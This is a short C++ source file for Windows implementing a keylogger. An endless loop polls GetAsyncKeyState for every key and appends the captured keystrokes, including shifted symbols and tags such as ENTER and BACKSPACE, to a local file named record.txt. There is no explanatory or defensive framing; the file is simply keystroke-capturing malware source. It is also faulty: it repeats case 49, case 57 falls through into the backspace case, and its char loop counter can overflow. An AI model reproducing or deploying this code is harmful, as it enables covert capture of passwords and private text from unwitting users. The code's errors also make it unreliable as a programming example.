#include<iostream>
#include<fstream>
#include<winuser.h>
#include<windows.h>
using namespace std;
void log() {
	char key;
	for (;;) {
		for (key = 8; key <= 222; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				ofstream write("record.txt", ios::app);
				if ((key > 64) && (key < 91) && !(GetAsyncKeyState(0x10))) {
					key += 32;
					write << key;
					write.close();
					break;
				} else if ((key > 64) && (key < 91)) {
					write << key;
					write.close();
					break;
				} else {
					switch (key) {
					case 49:
						if (GetAsyncKeyState(0x10))
							write << "!";
						else
							write << "1";
						break;
					case 48:
						if (GetAsyncKeyState(0x10))
							write << ")";
						else
							write << "0";
						break;
					case 49:
						if (GetAsyncKeyState(0x10))
							write << "!";
						else
							write << "1";
						break;
					case 50:
						if (GetAsyncKeyState(0x10))
							write << "@";
						else
							write << "2";
						break;
					case 51:
						if (GetAsyncKeyState(0x10))
							write << "#";
						else
							write << "3";
						break;
					case 52:
						if (GetAsyncKeyState(0x10))
							write << "$";
						else
							write << "4";
						break;
					case 53:
						if (GetAsyncKeyState(0x10))
							write << "%";
						else
							write << "5";
						break;
					case 54:
						if (GetAsyncKeyState(0x10))
							write << "^";
						else
							write << "6";
						break;
					case 55:
						if (GetAsyncKeyState(0x10))
							write << "&";
						else
							write << "7";
						break;
					case 56:
						if (GetAsyncKeyState(0x10))
							write << "*";
						else
							write << "8";
						break;
					case 57:
						if (GetAsyncKeyState(0x10))
							write << "(";
						else
							write << "9";
					case 8:
						write << "<BACKSPACE>";
						break;
					case 9:
						write << "<HRTAB>";
						break;
					case 10:
						write << "<NEWLINE>";
						break;
					case 11:
						write << "<VRTAB>";
						break;
					case 13:
						write << "<ENTER>\n";
						break;
					case 14:
						write << "<SHIFTOUT>";
						break;
					case 15:
						write << "<SHIFTIN>";
						break;
					case 24:
						write << "<CANCEL>";
						break;
					case 27:
						write << "<ESC>";
						break;
					case 127:
						write << "<DEL>";
						break;
					case 32:
						write << " ";
						break;
					default:
						break;
					}
				}
			}
		}
	}
}
int main() {
	log();
	return 0;
}
